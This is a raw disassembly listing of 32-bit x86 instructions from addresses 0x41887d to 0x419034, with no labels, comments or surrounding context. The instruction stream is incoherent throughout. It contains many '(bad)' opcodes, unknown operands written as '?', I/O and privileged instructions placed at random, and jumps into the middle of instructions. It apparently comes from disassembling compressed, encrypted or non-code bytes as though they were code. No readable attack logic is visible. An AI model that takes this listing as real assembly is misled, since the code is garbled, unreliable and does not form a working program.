  41887d:	dec    ebx
  41887e:	popa   
  41887f:	cmp    al,0xef
  418881:	pop    edx
  418882:	jno    0x418874
  418884:	jmp    0x4188fa
  418886:	sub    al,0x64
  418888:	inc    esi
  418889:	cmp    al,0xc1
  41888b:	jbe    0x4188e4
  41888d:	(bad)  
  41888e:	aas    
  41888f:	inc    esp
  418890:	mov    WORD PTR [esi],ss
  418892:	or     edi,DWORD PTR [edi+0x548e1c6]
  418898:	sbb    BYTE PTR [ecx],bl
  41889a:	mov    ecx,0xddc4e2b8
  41889f:	sub    BYTE PTR [eax+0x60995421],dh
  4188a5:	push   edi
  4188a6:	adc    ch,BYTE PTR [ebx+0x75595056]
  4188ac:	repnz stos BYTE PTR es:[edi],al
  4188ae:	test   DWORD PTR [edi-0x4bc2e884],esp
  4188b4:	sub    edi,eax
  4188b6:	cmp    DWORD PTR [edx+0x75db9b2f],esp
  4188bc:	pop    esi
  4188bd:	push   0x8278c95b
  4188c2:	aam    0x36
  4188c4:	shl    BYTE PTR ds:0x14644c06,0x75
  4188cb:	pop    ebp
  4188cc:	rol    DWORD PTR [ebx-0x1c],0xe4
  4188d0:	sahf   
  4188d1:	sbb    al,0xa0
  4188d3:	scas   eax,DWORD PTR es:[edi]
  4188d4:	pusha  
  4188d5:	adc    DWORD PTR [esi+0x41],eax
  4188d8:	bound  ecx,QWORD PTR [edx+0x249198f1]
  4188de:	jp     0x41894a
  4188e0:	sbb    DWORD PTR [ecx+eiz*8],edx
  4188e3:	das    
  4188e4:	sbb    ebx,DWORD PTR [ecx-0x61bfb89b]
  4188ea:	xchg   ecx,eax
  4188eb:	mov    dl,0xe
  4188ed:	pushf  
  4188ee:	lock test BYTE PTR ds:0x1d6bb06e,cl
  4188f5:	fild   WORD PTR [ebp+0x6854209]
  4188fb:	cmp    DWORD PTR [esi+0x4f],eax
  4188fe:	imul   BYTE PTR [ecx]
  418900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418901:	test   al,0x9
  418903:	xor    bl,BYTE PTR [edx+0x6d]
  418906:	pop    ebx
  418907:	add    al,0x2d
  418909:	in     eax,0xc9
  41890b:	daa    
  41890c:	pusha  
  41890d:	loope  0x418951
  41890f:	sub    eax,DWORD PTR [edi+edx*4-0x1f]
  418913:	mov    gs,WORD PTR [edi+0x1f]
  418916:	repnz cli 
  418918:	push   ebx
  418919:	jae    0x41889c
  41891b:	dec    esi
  41891c:	les    esp,FWORD PTR [esi+edi*8+0x1b]
  418920:	mov    ch,0x2d
  418922:	and    BYTE PTR [esi],ch
  418924:	inc    eax
  418925:	(bad)  
  418926:	dec    edi
  418927:	and    al,0xa
  418929:	mov    cl,0x62
  41892b:	cmp    al,0xbf
  41892d:	scas   al,BYTE PTR es:[edi]
  41892e:	cmp    esp,esp
  418930:	retf   0x8579
  418933:	mov    ecx,0x893f890c
  418938:	mul    BYTE PTR [ecx+0xc]
  41893b:	cmp    esi,DWORD PTR [ecx+ebx*4]
  41893e:	sbb    al,0x84
  418940:	cmp    bl,ah
  418942:	enter  0x7a52,0xad
  418946:	mov    ah,0xed
  418948:	push   edx
  418949:	xor    edx,DWORD PTR ds:0xef628d73
  41894f:	shl    BYTE PTR [edx+0x38],cl
  418952:	cmp    DWORD PTR [eax],0xffffff88
  418955:	(bad)  
  418956:	aas    
  418957:	sub    DWORD PTR gs:[edi+0x65],eax
  41895b:	fsubr  DWORD PTR [eax]
  41895d:	mov    eax,ds:0x17186789
  418962:	pop    ebp
  418963:	(bad)  
  418964:	mov    esp,0x8d1d2f69
  418969:	or     al,0x15
  41896b:	mov    edx,0x4e90e6e
  418970:	out    0x88,eax
  418972:	call   0x8b24:0x1dea0fde
  418979:	and    dh,BYTE PTR [edx]
  41897b:	fidiv  DWORD PTR [esi]
  41897d:	adc    bh,bh
  41897f:	in     al,dx
  418980:	bound  edx,QWORD PTR [edx-0x18e6814e]
  418986:	cmp    DWORD PTR [edi+0x175a0ba3],ecx
  41898c:	mov    al,0x4d
  41898e:	jmp    0x418980
  418990:	push   esp
  418991:	xchg   ebp,eax
  418992:	imul   ebx,ecx,0xfffffff2
  418995:	add    eax,DWORD PTR [esp+edx*1+0x1c]
  418999:	lock cmp ecx,DWORD PTR [ecx]
  41899c:	push   ss
  41899d:	jae    0x418925
  41899f:	in     eax,dx
  4189a0:	push   0x59a39d44
  4189a5:	sbb    ah,bl
  4189a7:	and    al,0x11
  4189a9:	and    bl,dl
  4189ab:	push   ds
  4189ac:	pop    esi
  4189ad:	dec    edi
  4189ae:	rcr    BYTE PTR [eax+0x5f],0xaa
  4189b2:	(bad)  
  4189b3:	psllq  mm4,QWORD PTR [edx+0x3d83088]
  4189ba:	push   ebx
  4189bb:	cmp    dh,BYTE PTR [esi+0x61]
  4189be:	out    dx,eax
  4189bf:	push   esp
  4189c0:	or     al,0xf0
  4189c2:	outs   dx,BYTE PTR ds:[esi]
  4189c3:	inc    edi
  4189c4:	cmp    BYTE PTR [ebx+0x41],al
  4189c7:	les    edi,FWORD PTR [edi]
  4189c9:	punpcklbw mm5,DWORD PTR [esi-0x58c9323a]
  4189d0:	add    esp,DWORD PTR [ebp+0x6ef198c5]
  4189d6:	mov    ch,0x9d
  4189d8:	scas   al,BYTE PTR es:[edi]
  4189d9:	ret    
  4189da:	pusha  
  4189db:	lds    esp,FWORD PTR [edx+ebx*4-0x193f00a3]
  4189e2:	mov    ch,0x68
  4189e4:	sbb    bh,ah
  4189e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4189e7:	in     al,dx
  4189e8:	mov    eax,ds:0x69397fff
  4189ed:	lea    ecx,[edx]
  4189ef:	inc    edx
  4189f0:	test   ebp,ecx
  4189f2:	jmp    DWORD PTR [ecx+0xc]
  4189f5:	xchg   esi,eax
  4189f6:	fwait
  4189f7:	ror    DWORD PTR [ecx],1
  4189f9:	mov    dh,0x54
  4189fb:	cmp    ecx,DWORD PTR [eax]
  4189fd:	push   0x66
  4189ff:	lods   eax,DWORD PTR ds:[esi]
  418a00:	repz mov bh,0x35
  418a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a04:	cmp    DWORD PTR [edx+0x6b7e1d4d],ebp
  418a0a:	mov    DWORD PTR ds:0x283672f0,edx
  418a10:	mov    al,ds:0xe2eabbf8
  418a15:	and    eax,DWORD PTR [ebp-0x4024e738]
  418a1b:	cmc    
  418a1c:	xor    DWORD PTR [edx-0x2d],eax
  418a1f:	adc    BYTE PTR [edi+ecx*2],bl
  418a22:	loope  0x418a60
  418a24:	push   edi
  418a25:	pusha  
  418a26:	jns    0x418a10
  418a28:	jmp    0x3991:0x2c443214
  418a2f:	sar    bl,1
  418a31:	jge    0x4189b4
  418a33:	push   es
  418a34:	test   DWORD PTR es:[ecx+0x18],esi
  418a38:	push   ss
  418a39:	jmp    0x418a7a
  418a3b:	pop    edi
  418a3c:	sbb    BYTE PTR [si-0x1c39],bl
  418a41:	mov    eax,0x1868a7ec
  418a46:	mov    BYTE PTR [esi],al
  418a48:	mov    ss,WORD PTR [ebx+0x6cc527f9]
  418a4e:	icebp  
  418a4f:	pop    esi
  418a50:	rcr    DWORD PTR [eax+0x75],1
  418a53:	or     al,0x74
  418a55:	cli    
  418a56:	jns    0x4189de
  418a58:	inc    edi
  418a59:	or     eax,0xe1806aa2
  418a5e:	mov    dh,cl
  418a60:	push   esp
  418a61:	inc    edi
  418a62:	mov    ecx,DWORD PTR [ecx+0x448bc2a2]
  418a68:	mov    ds,WORD PTR [edi]
  418a6a:	cwde   
  418a6b:	mov    eax,0xd208d036
  418a71:	clc    
  418a72:	out    0x60,eax
  418a74:	pop    ebx
  418a75:	jno    0x418a79
  418a77:	es jno 0x418aa3
  418a7a:	mov    BYTE PTR [edi+ecx*1-0xa],bl
  418a7e:	mov    ecx,0xd532f63e
  418a83:	repnz ins DWORD PTR es:[edi],dx
  418a85:	and    ebp,DWORD PTR [edi+0x65eb6851]
  418a8b:	repz dec ecx
  418a8d:	pop    ecx
  418a8e:	xchg   esp,eax
  418a8f:	test   edx,0x3075ac2f
  418a95:	fdiv   st(7),st
  418a97:	daa    
  418a98:	pop    eax
  418a99:	loope  0x418a31
  418a9b:	or     DWORD PTR [ebp-0x66c523dd],0xffffffe0
  418aa2:	dec    eax
  418aa3:	jle    0x418af6
  418aa5:	sub    ebx,DWORD PTR [ebp+0x2965b155]
  418aab:	mov    ah,0x92
  418aad:	mov    ds:0x5dfdec9e,al
  418ab2:	fnstsw WORD PTR [eax+0x19]
  418ab5:	sub    DWORD PTR [eax+0x1c],esp
  418ab8:	xor    al,BYTE PTR [ecx]
  418aba:	push   0x4e
  418abc:	sbb    ch,ah
  418abe:	adc    al,0xce
  418ac0:	(bad)  
  418ac1:	int3   
  418ac2:	icebp  
  418ac3:	cdq    
  418ac4:	sbb    cl,BYTE PTR [esi]
  418ac6:	sbb    dl,cl
  418ac8:	je     0x418b24
  418aca:	iret   
  418acb:	popf   
  418acc:	adc    dh,BYTE PTR [esi+0x49]
  418acf:	pop    esp
  418ad0:	aaa    
  418ad1:	imul   cx,bx,0x428f
  418ad6:	push   es
  418ad7:	out    dx,eax
  418ad8:	in     al,0xde
  418ada:	jae    0x418ab8
  418adc:	sar    BYTE PTR [ebx],1
  418ade:	xchg   ebp,eax
  418adf:	sub    al,0xc3
  418ae1:	fistp  DWORD PTR [ebp-0x4e9810a6]
  418ae7:	mov    ch,0xa7
  418ae9:	push   0xe827f791
  418aee:	push   edi
  418aef:	daa    
  418af0:	sub    al,0xa1
  418af2:	fs pop esi
  418af4:	push   ebx
  418af5:	fdiv   DWORD PTR [eax-0x4b422e04]
  418afb:	loopne 0x418b45
  418afd:	xchg   DWORD PTR [esi+0x73306fd9],ebx
  418b03:	mov    eax,0xccfcf9bd
  418b08:	push   ds
  418b09:	mov    dl,0x93
  418b0b:	ret    0x6733
  418b0e:	or     BYTE PTR [edx-0x73ffa9b3],0xe7
  418b15:	ss shr dl,1
  418b18:	adc    BYTE PTR [ebp+0x1af9ab80],dh
  418b1e:	inc    ebp
  418b1f:	fldcw  WORD PTR [ebp+0x20]
  418b22:	(bad)  
  418b23:	fisub  WORD PTR [ecx]
  418b25:	daa    
  418b26:	in     al,dx
  418b27:	or     eax,0xd971797f
  418b2c:	iret   
  418b2d:	in     eax,0x5d
  418b2f:	in     al,0xdb
  418b31:	loopne 0x418aeb
  418b33:	das    
  418b34:	bound  ecx,QWORD PTR [edx+edi*4+0x7b8e9cde]
  418b3b:	rcl    DWORD PTR [esi+ecx*4-0x3c8eebd8],cl
  418b42:	iretw  
  418b44:	fdivr  st,st(7)
  418b46:	xor    eax,0x41e96a
  418b4b:	mov    eax,DWORD PTR [edx+0x194]
  418b51:	jmp    0x418e6b
  418b56:	retf   
  418b57:	into   
  418b58:	ret    
  418b59:	ret    
  418b5a:	(bad)  
  418b5c:	retf   
  418b5d:	(bad)  
  418b5e:	xor    dh,cl
  418b60:	stos   DWORD PTR es:[edi],eax
  418b61:	push   eax
  418b62:	jae    0x418bdc
  418b64:	fistp  DWORD PTR [esi+0x787fc312]
  418b6a:	jnp    0x418bea
  418b6c:	js     0x418be6
  418b6e:	fisubr WORD PTR [edi+ebp*8+0x28]
  418b72:	stos   DWORD PTR es:[edi],eax
  418b73:	jl     0x418b2c
  418b75:	mov    ?,WORD PTR [esi+0x44]
  418b78:	aam    0x12
  418b7a:	hlt    
  418b7b:	mov    al,ds:0xd2cea3f2
  418b80:	push   esi
  418b81:	xchg   ecx,eax
  418b82:	(bad)  
  418b84:	out    dx,eax
  418b85:	int3   
  418b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b87:	mov    dl,0xd4
  418b89:	inc    ebx
  418b8a:	inc    esi
  418b8b:	cdq    
  418b8c:	lahf   
  418b8d:	(bad)  
  418b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b90:	dec    eax
  418b91:	test   eax,0x87f274a7
  418b96:	mov    ds:0x84ebdcac,eax
  418b9b:	(bad)  
  418b9c:	scas   al,BYTE PTR es:[edi]
  418b9d:	popf   
  418b9e:	dec    ebx
  418b9f:	mov    ah,0xd8
  418ba1:	xor    ecx,DWORD PTR [edx+edi*4-0x5a]
  418ba5:	xor    dh,BYTE PTR [eax+ecx*8]
  418ba8:	mov    esp,DWORD PTR [esi-0xb]
  418bab:	xor    al,0xa4
  418bad:	add    ah,al
  418baf:	out    dx,eax
  418bb0:	push   esp
  418bb1:	addr16 out 0xba,eax
  418bb4:	and    ecx,DWORD PTR [ebp-0x69]
  418bb7:	mov    BYTE PTR [eax+ebp*8],0x66
  418bbb:	mov    ds:0x62afecc5,al
  418bc0:	js     0x418bc9
  418bc2:	jmp    0xf5686186
  418bc7:	xchg   ecx,eax
  418bc8:	ret    0xc878
  418bcb:	call   DWORD PTR [ecx-0x45d2c011]
  418bd1:	in     eax,0xb7
  418bd3:	aam    0xad
  418bd5:	jnp    0x418bf1
  418bd7:	add    al,0x44
  418bd9:	cwde   
  418bda:	cmp    eax,0xc8e9025c
  418bdf:	jle    0x418c26
  418be1:	retf   0x815f
  418be4:	jbe    0x418c51
  418be6:	call   0x373a7323
  418beb:	add    BYTE PTR [esi+0x6f],ah
  418bee:	out    dx,al
  418bef:	mov    BYTE PTR [ebp+0x70],dh
  418bf2:	loope  0x418b87
  418bf4:	retf   0xb08c
  418bf7:	div    BYTE PTR [edx+0x7acb814e]
  418bfd:	pushf  
  418bfe:	repnz int3 
  418c00:	outs   dx,BYTE PTR ds:[esi]
  418c01:	iret   
  418c02:	outs   dx,BYTE PTR ds:[esi]
  418c03:	sub    BYTE PTR [ebx+esi*8+0xf40f189],al
  418c0a:	mov    ?,WORD PTR [edi]
  418c0c:	mov    esi,DWORD PTR [ecx+0x4c]
  418c0f:	arpl   WORD PTR [eax+0x69],ax
  418c12:	pop    ebp
  418c13:	shl    BYTE PTR [edi+0x3a],cl
  418c16:	xchg   ebx,eax
  418c17:	(bad)  
  418c18:	cli    
  418c19:	mov    dh,0x61
  418c1b:	repnz sbb BYTE PTR [esi],dl
  418c1e:	mov    ds:0xe95920de,eax
  418c23:	add    eax,DWORD PTR [ecx+0x4ea5b435]
  418c29:	test   BYTE PTR [ebx-0x35bb797a],dl
  418c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c30:	not    al
  418c32:	sti    
  418c33:	sbb    BYTE PTR [esi+0x4c0be550],dh
  418c39:	sbb    esi,ebp
  418c3b:	jns    0x418bce
  418c3d:	mov    eax,0x87599866
  418c42:	xchg   ecx,eax
  418c43:	xchg   ebp,eax
  418c44:	repz mov bl,0xf6
  418c47:	sub    al,0x27
  418c49:	xor    edi,DWORD PTR [esi]
  418c4b:	sub    DWORD PTR [ebp+0x2dc0daa4],esi
  418c51:	test   eax,0x9bd1dfba
  418c56:	jle    0x418c23
  418c58:	or     ah,BYTE PTR [edx]
  418c5a:	das    
  418c5b:	jp     0x418c4b
  418c5d:	mov    al,ds:0xc435b446
  418c62:	mov    BYTE PTR [edi+ebp*1],bl
  418c65:	cmp    al,0x3d
  418c67:	leave  
  418c68:	push   cs
  418c69:	adc    BYTE PTR [esi],ah
  418c6b:	mov    esp,0xaf337316
  418c70:	mov    eax,ds:0xe240161
  418c75:	jg     0x418c4c
  418c77:	(bad)  
  418c79:	lds    ecx,FWORD PTR [esi+0x56655503]
  418c7f:	push   ebp
  418c80:	inc    ecx
  418c81:	hlt    
  418c82:	fisttp WORD PTR [edi+0x5e]
  418c85:	ficom  DWORD PTR [eax-0x55]
  418c88:	sub    eax,0xa759cb63
  418c8d:	leave  
  418c8e:	sbb    al,dl
  418c90:	xor    bh,BYTE PTR [eax+0x18f9c63]
  418c96:	jle    0x418cc3
  418c98:	les    esi,FWORD PTR [eax+0x9]
  418c9b:	(bad)  [edx+0x41]
  418c9e:	lea    edx,[edi]
  418ca0:	cwde   
  418ca1:	push   ecx
  418ca2:	xor    eax,0xea644c43
  418ca7:	pop    edi
  418ca8:	mov    dh,bl
  418caa:	xchg   edi,eax
  418cab:	mov    ebx,0x7ad58a5c
  418cb0:	add    BYTE PTR [ebx+0x48d866ba],dh
  418cb6:	and    dh,BYTE PTR [edi-0x683ffeec]
  418cbc:	stos   BYTE PTR es:[edi],al
  418cbd:	pop    ebp
  418cbe:	mov    edx,0x4b398e5
  418cc3:	xchg   edx,eax
  418cc4:	or     DWORD PTR [ebp-0x40],eax
  418cc7:	data16 fcom QWORD PTR [edi-0x89d0137]
  418cce:	mov    ecx,DWORD PTR [ebx-0x8]
  418cd1:	je     0x418c69
  418cd3:	or     eax,0x9b1df0a7
  418cd8:	push   esi
  418cd9:	xor    DWORD PTR [ebp-0x51],0x49abd2a1
  418ce0:	rcr    DWORD PTR [edx-0x18],0x2b
  418ce4:	mov    edx,0x3bc74087
  418ce9:	mov    ds:0x9235c145,al
  418cee:	fdivr  QWORD PTR [esi+0x3a452874]
  418cf4:	mov    ss,edi
  418cf6:	cmp    bh,dh
  418cf8:	in     eax,0x12
  418cfa:	fwait
  418cfb:	mov    ah,0x2d
  418cfd:	fs jno 0x418d37
  418d00:	pop    esi
  418d01:	aas    
  418d02:	or     eax,0x2742c697
  418d07:	adc    eax,0x9a1f6a49
  418d0c:	fwait
  418d0d:	mov    eax,0xe2d8edea
  418d12:	fwait
  418d13:	cmc    
  418d14:	jb     0x418d8d
  418d16:	mov    ds:0xd8553f64,eax
  418d1b:	retf   0x405b
  418d1e:	jne    0x418d63
  418d20:	add    ebp,DWORD PTR es:[edi]
  418d23:	in     al,dx
  418d24:	in     al,dx
  418d25:	mov    al,0x6
  418d27:	les    ecx,FWORD PTR [esi+0x73ff56c3]
  418d2d:	int    0xd7
  418d2f:	mov    ch,0x86
  418d31:	sub    al,0xf2
  418d33:	(bad)  
  418d34:	nop
  418d35:	fidivr WORD PTR [esi+0x1e]
  418d38:	jbe    0x418d0b
  418d3a:	fild   WORD PTR [ebx]
  418d3c:	lea    ebx,[ebx+0x5a01600e]
  418d42:	push   0xd
  418d44:	aam    0xd7
  418d46:	dec    ebp
  418d47:	sub    BYTE PTR [eax+ebx*4-0x31adac03],dl
  418d4e:	mov    ecx,0x984d4698
  418d53:	icebp  
  418d54:	xchg   ecx,eax
  418d55:	imul   ebp,DWORD PTR [edx],0x41
  418d58:	dec    esp
  418d59:	mov    eax,0x2d3be42e
  418d5e:	adc    edi,DWORD PTR [ecx-0x55]
  418d61:	mov    cl,0xa8
  418d63:	sbb    eax,0xbb3bdee1
  418d68:	mov    edx,0xa6307d26
  418d6d:	pop    ecx
  418d6e:	adc    BYTE PTR [edi-0x535ba9d0],bh
  418d74:	jle    0x418dae
  418d76:	jo     0x418df6
  418d78:	call   0xd86a:0x8699da29
  418d7f:	(bad)  
  418d80:	in     al,0x56
  418d82:	mov    ebx,0x64a942de
  418d87:	jp     0x418dff
  418d89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d8a:	dec    esp
  418d8b:	pop    ecx
  418d8c:	pop    ecx
  418d8d:	into   
  418d8e:	mov    ah,0xb6
  418d90:	cmp    DWORD PTR ds:0xabf75036,ebx
  418d96:	out    0x74,eax
  418d98:	jmp    0x418d25
  418d9a:	xor    al,0xc8
  418d9c:	fucomp st(1)
  418d9e:	leave  
  418d9f:	cmp    eax,0xce8e2c61
  418da4:	xchg   ecx,eax
  418da5:	jo     0x418d59
  418da7:	mov    bl,0xc0
  418da9:	jno    0x418ddf
  418dab:	or     DWORD PTR [esi],ecx
  418dad:	dec    eax
  418dae:	pop    esp
  418daf:	rcl    DWORD PTR [esp+eiz*4+0x13],0x2a
  418db4:	test   eax,0x1c93018b
  418db9:	ins    BYTE PTR es:[edi],dx
  418dba:	sbb    DWORD PTR [ebx-0x4f8e155f],esi
  418dc0:	int    0x83
  418dc2:	(bad)  
  418dc3:	ds lahf 
  418dc5:	sbb    esp,edx
  418dc7:	push   cs
  418dc8:	ret    0xfa06
  418dcb:	pop    edi
  418dcc:	dec    ebp
  418dcd:	scas   al,BYTE PTR es:[edi]
  418dce:	scas   eax,DWORD PTR es:[edi]
  418dcf:	je     0x418e4f
  418dd1:	push   ebp
  418dd2:	sti    
  418dd3:	mov    edx,0x77f466a6
  418dd8:	cld    
  418dd9:	inc    esi
  418dda:	cmp    al,0x72
  418ddc:	push   ebx
  418ddd:	outs   dx,BYTE PTR ds:[esi]
  418dde:	inc    ebx
  418ddf:	hlt    
  418de0:	add    eax,0x4416695f
  418de5:	(bad)  
  418de6:	jp     0x418e25
  418de8:	pop    edx
  418de9:	or     BYTE PTR [edx-0x2a],0x67
  418ded:	popf   
  418dee:	jle    0x418e0b
  418df0:	dec    esi
  418df1:	pop    ebx
  418df2:	sub    al,0xb4
  418df4:	icebp  
  418df5:	push   ss
  418df6:	(bad)  
  418df7:	aad    0x96
  418df9:	ds jno 0x418e6a
  418dfc:	fmul   QWORD PTR [ebx+0x65535f4e]
  418e02:	call   0x53c8:0xe0a3cc22
  418e09:	cdq    
  418e0a:	jge    0x418dd8
  418e0c:	int    0x6c
  418e0e:	mul    DWORD PTR [ecx+edi*8-0x39]
  418e12:	dec    eax
  418e13:	xchg   ecx,eax
  418e14:	lock push ds
  418e16:	enter  0xb42,0xaa
  418e1a:	aam    0x2e
  418e1c:	jp     0x418e87
  418e1e:	into   
  418e1f:	mov    edx,0xf4ef1f4f
  418e24:	mov    dh,0x6d
  418e26:	inc    edi
  418e27:	hlt    
  418e28:	xor    BYTE PTR [edx-0x68],0x7b
  418e2c:	aas    
  418e2d:	outs   dx,DWORD PTR ds:[esi]
  418e2e:	cs push esi
  418e30:	aas    
  418e31:	cmp    ch,BYTE PTR [esi]
  418e33:	mov    esi,0x9fc759ac
  418e38:	bound  edx,QWORD PTR [ebx]
  418e3a:	loope  0x418e1a
  418e3c:	mov    gs,WORD PTR [ebp-0xd]
  418e3f:	adc    DWORD PTR [ecx+eiz*4+0x37],esi
  418e43:	call   0xc33c:0x349481bf
  418e4a:	add    dh,bh
  418e4c:	jg     0x418e7c
  418e4e:	and    al,0xd8
  418e50:	xchg   esp,eax
  418e51:	xor    BYTE PTR [ebx-0x3b],ch
  418e54:	push   esi
  418e55:	jecxz  0x418e5c
  418e57:	pop    ds
  418e58:	xchg   DWORD PTR [edi+0xd],ebp
  418e5b:	inc    esp
  418e5c:	ror    bl,1
  418e5e:	jo     0x418e47
  418e60:	stc    
  418e61:	push   ds
  418e62:	mov    esp,0x303a6ad0
  418e67:	enter  0xf108,0x29
  418e6b:	push   DWORD PTR [eax]
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	ins    DWORD PTR es:[edi],dx
  418e82:	mov    ebx,0xc00d72fe
  418e87:	jg     0x418f01
  418e89:	jnp    0x418f09
  418e8b:	js     0x418f05
  418e8d:	or     ah,BYTE PTR [edi]
  418e8f:	out    0xa2,al
  418e91:	(bad)  
  418e92:	fwait
  418e93:	sbb    BYTE PTR [eax-0x38],dl
  418e96:	std    
  418e97:	or     al,0x6
  418e99:	sub    ax,0xb0e1
  418e9d:	xchg   ebp,eax
  418e9e:	xchg   edi,eax
  418e9f:	inc    edx
  418ea0:	sbb    esi,DWORD PTR [edi-0x7d]
  418ea3:	out    dx,eax
  418ea4:	jo     0x418f22
  418ea6:	xchg   esp,eax
  418ea7:	push   ds
  418ea8:	xlat   BYTE PTR ds:[ebx]
  418ea9:	lods   al,BYTE PTR ds:[esi]
  418eaa:	bound  esp,QWORD PTR [eax-0x22bb1717]
  418eb0:	mov    dh,0xdc
  418eb2:	sti    
  418eb3:	jnp    0x418ee0
  418eb5:	jb     0x418ee7
  418eb7:	lahf   
  418eb8:	ins    DWORD PTR es:[edi],dx
  418eb9:	lock jne 0x418ec8
  418ebc:	inc    DWORD PTR [edi+edx*2]
  418ebf:	mov    edi,0x9b1b36b0
  418ec4:	in     eax,0xb1
  418ec6:	cmp    al,0xd5
  418ec8:	or     eax,ebx
  418eca:	fldenv [edx]
  418ecc:	(bad)
  418ed1:	or     al,0xcb
  418ed3:	xchg   ebx,eax
  418ed4:	jmp    0xd7f50bac
  418ed9:	out    0xb5,al
  418edb:	jle    0x418ebe
  418edd:	cmp    al,0xb2
  418edf:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  418ee1:	xchg   edx,eax
  418ee2:	cld    
  418ee3:	pop    ebp
  418ee4:	arpl   dx,bx
  418ee6:	fdiv   st,st(2)
  418ee8:	mov    esi,0x5fecc85c
  418eed:	dec    ecx
  418eee:	adc    ecx,DWORD PTR [ebx-0x42]
  418ef1:	sbb    edx,DWORD PTR [ecx-0x36]
  418ef4:	add    DWORD PTR [ebx+0xf],esi
  418ef7:	(bad)  
  418ef8:	xor    BYTE PTR [ebx],dh
  418efa:	call   0xf46c7a62
  418eff:	lahf   
  418f00:	push   ds
  418f01:	inc    ecx
  418f02:	clc    
  418f03:	ret    0xef8d
  418f06:	retf   0x73f3
  418f09:	sub    eax,DWORD PTR [edx+ebx*2+0x5b]
  418f0d:	div    BYTE PTR [ecx]
  418f0f:	jne    0x418ef2
  418f11:	sub    eax,ecx
  418f13:	es mov bl,0x4c
  418f16:	sbb    DWORD PTR [edi],ebx
  418f18:	pop    esp
  418f19:	cmc    
  418f1a:	mov    WORD PTR [edx-0x60],fs
  418f1d:	iret   
  418f1e:	sbb    al,0xaa
  418f20:	mov    esi,0xc70fb9ea
  418f25:	or     al,0x9d
  418f27:	adc    bl,BYTE PTR [edi]
  418f29:	mov    esi,0x6a9250bc
  418f2e:	das    
  418f2f:	mov    bh,0xc5
  418f31:	popf   
  418f32:	inc    esp
  418f33:	or     BYTE PTR [esi],0x3b
  418f36:	xchg   edi,eax
  418f37:	pop    esp
  418f38:	outs   dx,BYTE PTR ds:[esi]
  418f39:	loopne 0x418f1a
  418f3b:	xchg   edx,eax
  418f3c:	sbb    BYTE PTR [ebp-0x69],cl
  418f3f:	adc    esi,DWORD PTR [edx+edx*2-0x6f]
  418f43:	test   al,0x76
  418f45:	sub    bl,ah
  418f47:	cmp    bh,BYTE PTR [edx-0x73]
  418f4a:	mov    bl,0xb8
  418f4c:	pop    ebp
  418f4d:	in     al,dx
  418f4e:	(bad)  
  418f4f:	(bad)  ds:[ebx]
  418f52:	test   BYTE PTR [edx+0x7206fa6b],cl
  418f58:	mov    ebx,0x97cde659
  418f5d:	add    esp,esp
  418f5f:	adc    bl,dl
  418f61:	dec    edx
  418f62:	adc    eax,0xf7a36b16
  418f67:	int3   
  418f68:	jp     0x418f5b
  418f6a:	aam    0x1b
  418f6c:	sahf   
  418f6d:	jmp    0x418f33
  418f6f:	test   eax,0x7fc552d7
  418f74:	clc    
  418f75:	dec    edi
  418f76:	pushf  
  418f77:	loop   0x418f71
  418f79:	daa    
  418f7a:	xchg   BYTE PTR [esi+edi*8+0x62b89a13],ah
  418f81:	ss adc al,0xc2
  418f84:	adc    DWORD PTR [ebx-0x3b3f0b7b],ecx
  418f8a:	or     al,0xc1
  418f8c:	cdq    
  418f8d:	aaa    
  418f8e:	adc    DWORD PTR [eax+0x71],0x6357eddf
  418f95:	xor    ebx,0xe2e7e719
  418f9b:	ja     0x418fd3
  418f9d:	aas    
  418f9e:	cli    
  418f9f:	int3   
  418fa0:	adc    al,0xe8
  418fa2:	xchg   si,ax
  418fa4:	jne    0x418f63
  418fa6:	fmul   QWORD PTR [ebp+0x523c7546]
  418fac:	pop    edx
  418fad:	or     DWORD PTR [edx],0x43
  418fb0:	ret    
  418fb1:	push   ebx
  418fb2:	fisttp WORD PTR [bx+0x17]
  418fb6:	push   ebx
  418fb7:	ins    DWORD PTR es:[edi],dx
  418fb8:	sar    edx,0xc6
  418fbb:	pusha  
  418fbc:	pop    edx
  418fbd:	cmp    al,0x65
  418fbf:	jbe    0x419015
  418fc1:	mov    cl,0x88
  418fc3:	icebp  
  418fc4:	rcl    BYTE PTR [esi*1+0x6f7ebd3e],0x8e
  418fcc:	adc    al,BYTE PTR [eax]
  418fce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fcf:	mov    esi,0xbc08e4
  418fd4:	pop    es
  418fd5:	sbb    bh,BYTE PTR [edi+0x309987f2]
  418fdb:	fwait
  418fdc:	js     0x419029
  418fde:	stc    
  418fdf:	scas   al,BYTE PTR es:[edi]
  418fe0:	pop    esi
  418fe1:	rcr    DWORD PTR [edi],0xf2
  418fe4:	mov    ds:0x23838ecf,al
  418fe9:	js     0x418f6b
  418feb:	xor    esi,DWORD PTR [ecx+0x54]
  418fee:	mov    ecx,0x8bd62f53
  418ff3:	clc    
  418ff4:	lds    ebp,FWORD PTR [esi]
  418ff6:	pop    ecx
  418ff7:	xor    al,0xc
  418ff9:	and    eax,0x747b4dd1
  418ffe:	retf   
  418fff:	rcr    BYTE PTR [esi+0x68],cl
  419002:	retf   0x7df6
  419005:	mov    eax,ds:0x7d747fa8
  41900a:	ror    DWORD PTR [edi],cl
  41900c:	rcr    DWORD PTR [eax],0xd3
  41900f:	xchg   edi,eax
  419010:	nop
  419011:	fbld   TBYTE PTR [ebx-0x20]
  419014:	push   esi
  419015:	and    esi,DWORD PTR [esi-0x5fa70040]
  41901b:	dec    edx
  41901c:	call   0xcd3c:0x1c60f1ff
  419023:	xchg   DWORD PTR [ecx+0x67c00c9a],ebx
  419029:	mov    edx,0xad84327b
  41902e:	fstp   DWORD PTR [ebx]
  419030:	lock (bad) 
  419032:	push   ecx
  419033:	out    dx,al
  419034:	add    al,0x66
